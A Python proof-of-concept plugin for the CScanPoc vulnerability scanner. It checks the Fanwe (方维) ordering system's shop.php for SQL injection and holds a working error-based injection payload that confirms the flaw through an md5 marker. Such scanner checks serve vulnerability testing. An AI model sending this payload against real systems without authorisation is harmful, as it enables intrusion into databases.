# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'fanwe_0005' # 平台漏洞编号，留空
    name = '方维订餐系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-10-10'  # 漏洞公布时间
    desc = '''
        方维订餐系统 shop.php 参数过滤不完整，报错，产生注入。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '方维订餐系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e513ffb2-7a04-4770-aa60-62ec9ce48ad3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/shop.php?ctl=index&act=ajax_purpose_store&purpose_id=1%20and%20(select/**/%201%20from/**/%20(select/**/%20count(*),concat(md5(123),floor(rand(0)*2))x%20from/**/%20information_schema.tables%20group%20by%20x)a)#'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if  r.status_code == 200 and "202cb962ac59075b964b07152d234b701" in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
